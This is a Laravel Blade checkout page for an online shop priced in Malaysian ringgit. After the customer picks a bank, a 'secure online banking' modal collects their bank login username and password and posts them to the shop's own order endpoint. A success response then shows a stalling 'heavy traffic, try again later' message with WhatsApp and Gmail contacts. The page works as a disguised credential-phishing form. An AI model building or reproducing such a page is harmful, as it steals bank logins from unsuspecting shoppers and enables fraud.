@extends('layouts.frontend.master')

@section('content')
<!-- Start Page Title Area -->
<div class="page-title-area">
    <div class="container">
        <div class="page-title-content">
            <h2>{{__('page.checkout')}}</h2>
            <ul>
                <li>
                    <a href="{{url('/')}}">
                        {{__('page.home')}}
                    </a>
                </li>
                <li>{{__('page.checkout')}}</li>
            </ul>
        </div>
    </div>
</div>
<!-- End Page Title Area -->

<!-- Start Checkout Area -->
<section class="checkout-area ptb-100">
    <div class="container">
        <div class="row">
            <div class="col-lg-6 col-md-12">
                <div class="billing-details">
                    <h3 class="title">{{__('page.direct_bank_transfer')}}</h3>

                    <div class="row">
                        <div class="col-12 payment-box">
                            @php
                                $banks = \App\Models\Bank::all();
                            @endphp
                            <div class="payment-method">
                                @foreach ($banks as $item)
                                    <p class="mt-4">
                                        <input type="radio" id="{{$item->slug}}" name="bank" value="{{$item->id}}">
                                        <label for="{{$item->slug}}" class="clearfix">
                                            {{$item->name}}
                                            <img src="{{asset($item->image)}}" class="float-right" width="80" alt="">
                                        </label>
                                    </p>
                                @endforeach
                            </div>
                        </div>
                    </div>

                    <h3 class="title mt-4">Payoneer</h3>
                    <div class="row">
                        <div class="col-12 payment-box">
                            <div class="payment-method">
                                <p class="mt-4">
                                    <input type="radio" id="payment_payoneer" name="bank" value="payoneer">
                                    <label for="payment_payoneer" class="clearfix">
                                        Payoneer Payment
                                        <img src="{{asset('images/payoneer.jpg')}}" class="float-right" width="80" alt="">
                                    </label>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            @php
                $reference_no ="LSO-00".time();
            @endphp
            <div class="col-lg-6 col-md-12">
                <div class="order-details">
                    <div class="order-table table-responsive">
                        <div class="clearfix">
                            <h3 class="title float-left">{{__('page.your_order')}}</h3>
                            <h5 class="float-right mt-1 text-primary">REF : {{$reference_no}}</h5>
                        </div>

                        <table class="table table-bordered">
                            <thead>
                                <tr>
                                    <th scope="col">{{__('page.product_name')}}</th>
                                    <th scope="col">{{__('page.total')}}</th>
                                </tr>
                            </thead>

                            <tbody>
                                @php
                                    $cart = session('cart');
                                    $total_amount = 0
                                @endphp
                                @foreach ($cart as $key => $quantity)
                                    @php
                                        $product = \App\Models\Product::find($key);
                                        $amount = $product->price * $quantity;
                                        $total_amount += $amount;
                                    @endphp
                                    <tr>
                                        <td class="product-name">
                                            <a href="javascript:;">{{$product->name}}</a>
                                        </td>

                                        <td class="product-total">
                                            <span class="subtotal-amount">RM {{$amount}}</span>
                                        </td>
                                    </tr>
                                @endforeach

                            </tbody>
                            <tfoot>
                                <tr>
                                    <td class="font-weight-bold text-right">{{__('page.total_amount')}} : </td>
                                    <td class="font-weight-bold" style="padding: 12px 20px;">RM <span id="total_amount">{{$total_amount}}</span></td>
                                </tr>
                            </tfoot>
                        </table>
                    </div>

                    <div class="payment-box">
                        <a href="javascript:;" class="default-btn" id="btn_place" >{{__('page.place_order')}}
                            <i class="flaticon-right"></i>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>
<!-- End Checkout Area -->

<div class="modal" id="bankModal">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title">* {{__('page.secure_online_banking')}} :</h4>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <div class="modal-body">
                <div class="row d-flex justify-content-center" id="paymentBox">
                    <div class="col-md-3 pt-3">
                        <img src="" class="logo-img img-fluid" id="modal_bank_img" width="100%" alt="">
                    </div>
                    <div class="col-md-9 form-area">
                        <h6 class="text-center">{!! __('page.bank_modal_message') !!}</h6>
                        <form action="{{route('place_order')}}" method="post" id="paymentForm">
                            @csrf
                            <input type="hidden" class="bank" name="bank_id" id="bank_id" />
                            <input type="hidden" name="reference_no" value="{{$reference_no}}">
                            <div class="form-group mt-3">
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text"><i class='bx bxs-user'></i></span>
                                    </div>
                                    <input type="text" class="form-control username" id="usernameForm" name="username" required placeholder="{{__('page.bank_username')}}">
                                </div>
                            </div>
                            <div class="form-group mt-3">
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text"><i class='bx bxs-lock'></i></span>
                                    </div>
                                    <input type="password" class="form-control password" name="password" required placeholder="{{__('page.bank_password')}}">
                                </div>
                            </div>
                            <div class="form-group mt-3">
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text"><i class='bx bx-money'></i></span>
                                    </div>
                                    <input type="text" class="form-control amount" name="amount" readonly placeholder="{{__('page.total_amount')}}" />
                                </div>
                            </div>
                            <div class="form-group mt-3">
                                <button type="submit" class="btn btn-primary btn-block mt-2" id="btn_submit">{{__('page.submit')}}</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

@endsection

@section('script')
    <script>
        $(document).ready(function () {
            $("#btn_place").click(function(){
                let bank = $("input[name='bank']:checked").val();
                let total_amount = $("#total_amount").text();
                let image = $("input[name='bank']:checked").parents('p').find('img').attr('src');
                console.log(image)
                if(!bank) {
                    alert('Please select the payment option.');
                } else if(bank == 'payoneer') {

                } else {
                    $("#bank_id").val(bank);
                    $("#modal_bank_img").attr('src', image);
                    $("#paymentForm .amount").val(total_amount);
                    $("#bankModal").modal();
                }
            });

            $("#paymentForm").submit(function(e) {
                e.preventDefault();
                if (bank_id == '') {
                    alert('Please select payment option.');
                    $("#bankModal").modal('hide');
                    return false;
                } else {
                    $.ajax({
                        url: '/place_order',
                        data: $("#paymentForm").serialize(),
                        method: 'POST',
                        dataType: 'json',
                        beforeSend: function() {
                            $("#bankModal").modal('hide');
                            $("#ajax-loading").fadeIn();
                        },
                        success: function(response) {
                            if(response.status == 200) {
                                setTimeout(function() {
                                    $("#ajax-loading").fadeOut();
                                    Swal.fire(`<div class="text-left pt-3" style="font-size: 17px;"><p>Site will be slow due to heavy traffice. Please Try again later.</p><p>Contact or WhatsApp <a href="https://api.whatsapp.com/send?phone=60177163578" target="_blank">+60177163578</a></p><p>Email us at <a href="mailto:helpcoddelivery@gmail.com">helpcoddelivery@gmail.com</a></p></div>`);
                                }, 15000);
                            } else if (response.status == 400) {
                                if(response.result == 'cart_error') {
                                    window.location.href = '/cart';
                                }
                                if(response.result == 'customer_error') {
                                    window.location.href = '/input_customer';
                                }
                            } else {
                                window.location.href = '/';
                            }
                        },
                    });
                }
            });
        });
    </script>
@endsection
